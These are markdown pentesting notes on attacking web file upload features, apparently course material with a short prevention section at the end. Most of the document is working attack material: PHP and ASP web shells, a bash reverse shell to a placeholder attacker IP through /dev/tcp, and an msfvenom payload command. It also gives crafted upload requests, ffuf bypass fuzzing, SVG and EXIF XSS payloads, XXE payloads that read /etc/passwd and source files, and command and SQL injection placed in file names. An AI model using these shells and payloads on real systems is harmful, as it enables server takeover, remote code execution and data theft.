### Content
- [Web Shells](#web-shells)
- [Bypassing Filters](#bypassing-filters)
	- [File Extension Validation](#file-extension-validation)
		- [Client-Side Validation](#client-side-validation)
		- [Blacklist Filters](#blacklist-filters)
		- [Whitelist Filters](#whitelist-filters)
	- [Type Filters](#type-filters)
- [Various File Uploads Techniques](#various-file-uploads-techniques)
	- XSS
	- XXE
	- Injections in File Name
	- Upload Directory Disclosure
	- Windows-specific Attacks
	- DOS
- [Prevention](#prevention)
---
> [!NOTE]
> - Fuzz the file extension using a [Web Extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt) wordlist or use Wappalyzer extension to Identify the site web framework.
> - `PayloadsAllTheThings` provides lists of extensions for [PHP](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) and [.NET](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP) web applications.
> - `SecLists` list of common [Web Extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt).
> - SecLists' [Content-Type Wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt).
> - Web shells [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells).
> - PHP web shells: [phpbash](https://github.com/Arrexel/phpbash).
> - PHP Reverse web shell: [php-reverse-shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php), Don't forget to change the listener IP and Port.

---
# Web Shells
- PHP
	``` PHP
	<?php echo "File Uploaded";?>
	# Execute a command or connect to listenning reverse shell
	<?php shell_exec('bash -c "bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1"'); ?>
	# Uploade a web shell that you can interact with by visit http://IP:PORT/<UploadPath>/shell.php?cmd=whoami
	# In case of using this custom web shell, use source-view by clicking `[CTRL+U]`
	<?php system($_REQUEST['cmd']); ?>
	```
	
Or custom reverse web shell with msfvenom: `msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php` 
- .NET
	``` asp
	<% eval request('cmd') %>
	```
---
# Bypassing Filters
## File Extension Validation
### Client-Side Validation
- If the file format validation is on the client-side, try bypass it by:
	- Modify the upload request to the back-end server.
	- Manipulate the front-end code to disable these type validations.
#####  **Scenario**:
- We got a form to upload a profile pic to user account
	``` HTML
	<form action="upload.php" method="POST" enctype="multipart/form-data" id="uploadForm" onSubmit="if(validate()){upload()}">
		<input type="file" name="uploadFile" id="uploadFile" onChange="showImage()" accept=".jpg,.jpeg,.png">
		<img src='/profile_images/pic.png' class='profile-image' id='profile-image'>
		<input type="submit" value="Upload" id="submit">
	</form>
	```
##### Back-end Request Modification
- Sending photo and inspect the request
``` HTTP
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywRdo2lC1tHQrJPoV

------WebKitFormBoundarywRdo2lC1tHQrJPoV
Content-Disposition: form-data; name="uploadFile"; filename="ping.png"
Content-Type: image/png

[....SNIP....]
------WebKitFormBoundarywRdo2lC1tHQrJPoV--
```
- Manipulate the request. (Change the `filename` and its `content`, We may also modify the `Content-Type` of the uploaded file.
``` HTTP
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywRdo2lC1tHQrJPoV

------WebKitFormBoundarywRdo2lC1tHQrJPoV
Content-Disposition: form-data; name="uploadFile"; filename="shell.php"
Content-Type: image/png

<?php system($_REQUEST['cmd']); ?>
------WebKitFormBoundarywRdo2lC1tHQrJPoV--
```
##### Disabling Front-end Validation
- Open the web page inspector on the browser [CTRL+SHIFT+C] to see the form HTML
	``` HTML
	<input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
	```
	- The file input specifies (`.jpg,.jpeg,.png`) but we can bypass this by selecting All Files on the file explorer.
	- The main restriction will be the JS code `onchange="checkFile(this)"` . To get the details of this function, go to the browser's `Console` and search for `checkFile`
	- Edit the HTML code to be:
		``` HTML
		<input type="file" name="uploadFile" id="uploadFile" onchange="">
		```
### Blacklist Filters
Testing the file extension against a blacklist of extension to determine whether the upload request should be blocked.
- Code example:
``` PHP
$fileName = basename($_FILES["uploadFile"]["name"]);
$extension = pathinfo($fileName, PATHINFO_EXTENSION);
$blacklist = array('php', 'php7', 'phps');
if (in_array($extension, $blacklist)) { echo "File type not allowed"; die(); }
```
- The blacklist is not comprehensive for PHP.
- The comparison above is also case-sensitive.

Fuzzing the request with ffuf:
1. Prepare the HTTP request
``` HTTP
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywRdo2lC1tHQrJPoV

------WebKitFormBoundarywRdo2lC1tHQrJPoV
Content-Disposition: form-data; name="uploadFile"; filename="shellFUZZ"
Content-Type: image/png

<?php system($_REQUEST['cmd']); ?>
------WebKitFormBoundarywRdo2lC1tHQrJPoV--
```
2. Use ffuf
``` bash
$ ffuf -w phpExtensions.txt -request request.txt -u http://167.71.131.167:32653/upload.php
.phpt                   [Status: 200, Size: 26, Words: 3, Lines: 1, Duration: 105ms] // successful hit
.php                    [Status: 200, Size: 21, Words: 3, Lines: 1, Duration: 108ms]
.pgif                   [Status: 200, Size: 26, Words: 3, Lines: 1, Duration: 2457ms] // successful hit
.php8                   [Status: 200, Size: 26, Words: 3, Lines: 1, Duration: 2458ms] // successful hit
.phar                   [Status: 200, Size: 26, Words: 3, Lines: 1, Duration: 2456ms] // successful hit
```
> Not all extensions will work with all web server configurations, try several extensions to get one that successfully executes PHP code.
### Whitelist Filters
A whitelist is generally more secure than a blacklist. The web server would only allow the specified extensions, and the list would not need to be comprehensive in covering uncommon extensions.
- **Techniques**:
	- `Double extension`, (e.g. `shell.jpg.php`).
		- If the `regex` only checks whether the file name `contains` the extension and not if it actually `ends` with it.
			``` PHP
			$fileName = basename($_FILES["uploadFile"]["name"]);
			if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) { echo "Only images are allowed"; die(); }
			```
	- `Reverse Double Extension`, (e.g. `shell.php.jpg`).
		- If The `regex` is strict.
			``` PHP
			if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ...SNIP... }
			```
		- In some cases, file upload functionality may not be vulnerable, but the server configuration may lead to a vulnerability.
		- For example, the `/etc/apache2/mods-enabled/php7.4.conf` for the `Apache2`
			``` xml
			<FilesMatch ".+\.ph(ar|p|tml)">
				SetHandler application/x-httpd-php
			</FilesMatch>
			```
			- The above configuration is how the web server determines which files to allow PHP code execution.
			- (`shell.php.jpg`) should pass the earlier whitelist test as it ends with (`.jpg`), and it would be able to execute PHP code due to the above misconfiguration, as it contains (`.php`) in its name.
	- `Character Injection`
		- Inject characters before or after the final extension to cause the application to misinterpret the filename and execute the uploaded file as a PHP script. ex:
			- `%20`, `%0a`, `%00`, `%0d0a`, `/`, `.\`, `.`, `…`, `:`
			- Bash script that generates all permutations of the file name:
				``` bash
				for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
				    for ext in '.php' '.phps'; do    #TO USE WORDLIST:  for ext in $(cat phpExtensions.txt); do
				        echo "shell$char$ext.jpg" >> wordlist.txt
				        echo "shell$ext$char.jpg" >> wordlist.txt
				        echo "shell.jpg$char$ext" >> wordlist.txt
				        echo "shell.jpg$ext$char" >> wordlist.txt
				    done
				done
				```
## Type Filters
We may utilize some allowed extensions (e.g., SVG) to perform other attacks.
> [!NOTE]
> A file upload HTTP request has two Content-Type headers:
> - One for the attached file (at the bottom), Which we usually need to modify.
> - One for the full request (at the top), Which in some cases the request will only contain (e.g. uploaded content sent as `POST` data), then we will need to modify it.
- Two common methods for validating the file content: `Content-Type Header` or `File Content`.
	- `Content-Type`
		- Example of how a PHP web application tests the `Content-Type` header to validate the file type
			``` PHP
			$type = $_FILES['uploadFile']['type'];
			if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) { echo "Only images are allowed"; die(); }
			```
		- Fuzz Content-Type header with SecLists' [Content-Type Wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt).
			``` bash
			$ cat content-type.txt | grep 'image/' > image-content-types.txt
			$ cat request.txt
			
			POST /upload.php HTTP/1.1
			Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywRdo2lC1tHQrJPoV
			
			------WebKitFormBoundarywRdo2lC1tHQrJPoV
			Content-Disposition: form-data; name="uploadFile"; filename="shell.php"
			Content-Type: FUZZ
			
			<?php system($_REQUEST['cmd']); ?>
			------WebKitFormBoundarywRdo2lC1tHQrJPoV--
			```
	- `MIME-Type` 
		- `Multipurpose Internet Mail Extensions (MIME)`, internet standard that determines the type of a file through its general format and bytes structure.
		- By inspecting the first few bytes of the file's content, which contain the [File Signature](https://en.wikipedia.org/wiki/List_of_file_signatures) or [Magic Bytes](https://opensource.apple.com/source/file/file-23/file/magic/magic.mime).
			``` bash
			$ echo "this is a text file" > text.jpg && file text.jpg 
			text.jpg: ASCII text
			$ echo "GIF8" > text.jpg && file text.jpg
			text.jpg: GIF image data
			```
		- Example shows how a PHP web application can test the MIME type of an uploaded file:
			``` PHP
			$type = mime_content_type($_FILES['uploadFile']['tmp_name']);
			if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) { echo "Only images are allowed"; die(); }
			```
		- Snippet from the HTTP request before
			``` TXT
			------WebKitFormBoundarywRdo2lC1tHQrJPoV
			Content-Disposition: form-data; name="uploadFile"; filename="shell.php"
			Content-Type: image/png
			
			<?php system($_REQUEST['cmd']); ?>
			------WebKitFormBoundarywRdo2lC1tHQrJPoV--
			```
		- After
			``` TXT
			------WebKitFormBoundarywRdo2lC1tHQrJPoV
			Content-Disposition: form-data; name="uploadFile"; filename="shell.php"
			Content-Type: image/jpg
			
			GIF8
			<?php system($_REQUEST['cmd']); ?>
			------WebKitFormBoundarywRdo2lC1tHQrJPoV--
			```

>[!NOTE]
> Combine all of the attacks `Allowed MIME type with a disallowed Content-Type`, an `Allowed MIME/Content-Type with a disallowed extension`, or a `Disallowed MIME/Content-Type with an allowed extension`, and so on. EX:

``` HTTP
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywRdo2lC1tHQrJPoV

------WebKitFormBoundarywRdo2lC1tHQrJPoV
Content-Disposition: form-data; name="uploadFile"; filename="FUZZ1"
Content-Type: FUZZ2

GIF8 or FUZZ3
<?php system($_REQUEST['cmd']); ?>
------WebKitFormBoundarywRdo2lC1tHQrJPoV--
```
---
# Various File Uploads Techniques
- If the upload forms have secure filters that may not be exploitable, which only allows us to upload specific file types.
- Certain file types, like `SVG`, `HTML`, `XML`, and even some image and document files, may allow us to upload malicious versions of these files.
### XSS
- If web app allows us to upload HTML files, we can inject them with JS code to carry a (`Stored XSS`) or CSRF attack.
- If the web app displays an image metadata after its upload, we can include an XSS payload in one of the Metadata parameters.
- If we change the image's MIME-Type to `text/html`, some web applications may show it as an HTML document instead of an image, in which case the XSS payload would be triggered even if the metadata wasn't directly displayed.
- XSS carried by image metadata:
	``` bash
	$ exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
	$ exiftool HTB.jpg
	...SNIP...
	Comment                         :  ><img src=1 onerror=alert(window.origin)>
	```
- XSS carried by `SVG` images, `Scalable Vector Graphics (SVG)` images are XML-based. write the following to `HTB.svg`:
	``` XML
	<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
	<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
	    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
	    <script type="text/javascript">alert(window.origin);</script>
	</svg>
	```
### XXE
- With SVG images, we can also include malicious XML data to leak the source code of the web application, and other internal documents within the server.
- Leak the content of `/etc/passwd`
	``` XML
	<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
	<svg version="1.1" width="1" height="1" >&xxe;</svg>
	```
- To use XXE to read source code in PHP web applications
	```
	<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
	<svg>&xxe;</svg>
	```

> After uploading the payload, go to a page that should display the image, open the source code of the page.
### Injections in File Name
- If the web application uses the file name within an OS command
	- `file$(whoami).jpg` or ``file`whoami`.jpg`` or `file.jpg||whoami`
- XSS payload in file name (e.g. `<script>alert(window.origin);</script>`), which would get executed on the target's machine if the file name is displayed to them.
- inject a SQL query in file name (e.g. `file';select+sleep(5);--.jpg`), which may lead to an SQL injection if the file name is insecurely used in an SQL query.
### Upload Directory Disclosure
- Refer to IDOR notes.
### Windows-specific Attacks
- To cause an error that discloses the upload directory:
	- One such attack is using reserved characters, such as (`|`, `<`, `>`, `*`, or `?`), which are usually reserved for special uses like wildcards.
	- Use Windows reserved names for the uploaded file name, like (`CON`, `COM1`, `LPT1`, or `NUL`).
	- Utilize the Windows [8.3 Filename Convention](https://en.wikipedia.org/wiki/8.3_filename) to overwrite existing files or refer to files that do not exist.
	- In older versions of Windows, they used a Tilde character (`~`) to complete the file name.
		- To refer to a file called (`helpfulNotes.txt`) we can use (`HEL~1.TXT`) or (`HEL~2.TXT`), the digit represents the order of the matching files that start with (`HEL`).
		- As Windows still supports this convention, we can write a file called (e.g. `WEB~.CONF`) to overwrite the `web.conf` file.
### DOS
- We can use the technique discussed in the XXE notes.
- `Decompression Bomb`
	- If a web application automatically unzips a ZIP archive, it is possible to upload a malicious archive containing nested ZIP archives within it, which can eventually lead to many Petabytes of data, resulting in a crash on the back-end server.
- `Pixel Flood`
	- with some image files that utilize image compression, like `JPG` or `PNG`. Create any `JPG` image file with any image size (e.g. `500x500`), then manually modify its compression data to say it has a size of (`0xffff x 0xffff`), resulting in an image with a perceived size of 4 Gigapixels.
	- When the web application attempts to display the image, it will attempt to allocate all of its memory to this image.
- If the upload function is vulnerable to directory traversal, we may also attempt uploading files to a different directory (e.g. `../../../etc/passwd`), which may also cause the server to crash.
---
# Prevention
1. **Extension Validation**
	1. It is recommended to use both by whitelisting the allowed extensions and blacklisting dangerous extensions.
	2. This way, the blacklist list will prevent uploading malicious scripts if the whitelist is ever bypassed (e.g. `shell.php.jpg`).
	3. Example shows how this can be done with a PHP web application:
		``` PHP
		$fileName = basename($_FILES["uploadFile"]["name"]);
		
		// blacklist test
		if (preg_match('/^.+\.ph(p|ps|ar|tml)/', $fileName)) {
		    echo "Only images are allowed";
		    die();
		}
		
		// whitelist test
		if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) {
		    echo "Only images are allowed";
		    die();
		}
		```
		- The blacklist tests if the extension exists anywhere within the file name.
		- The whitelist test if the file ends with allowed extensions.
2. **Content Validation**
	1. Always make sure that the file extension matches the file's content.
	2. Example shows us how we can validate both the File Signature and the HTTP Content-Type header.
		```PHP
		$fileName = basename($_FILES["uploadFile"]["name"]);
		$contentType = $_FILES['uploadFile']['type'];
		$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);
			
		// content test
		foreach (array($contentType, $MIMEtype) as $type) {
		    if (!in_array($type, array('image/png'))) {
		        echo "Only PNG images are allowed";
		        die();
		    }}
		```
3. **Further Security**
	1. Avoid disclosing the uploads directory or providing direct access to the uploaded file.
	2. write a `download.php` script to fetch the requested file from the uploads directory and then download the file for the end-user.
	3. Make sure that the `download.php` script only grants access to files owned by the users.
		1. This can be achieved by utilizing the `Content-Disposition` and `nosniff` headers and using an accurate `Content-Type` header.
	4. Randomize the names of the uploaded files in storage and store their "sanitized" original names in a database.
	5. Store the uploaded files in a separate server or container.
	6. Prevent web apps from accessing files outside their restricted directories by using configurations like (`open_basedir`) in PHP.
	7. In PHP, we can use the `disable_functions` configuration in `php.ini` and add functions, like `exec`, `shell_exec`, `system`, `passthru`, and a few others.
	8. Disable showing any system or server errors, to avoid sensitive information disclosure.
	9. Some tips:
		1. Limit file size.
		2. Update any used libraries.
		3. Scan uploaded files for malware or malicious strings.
		4. Utilize a Web Application Firewall (WAF) as a secondary layer of protection.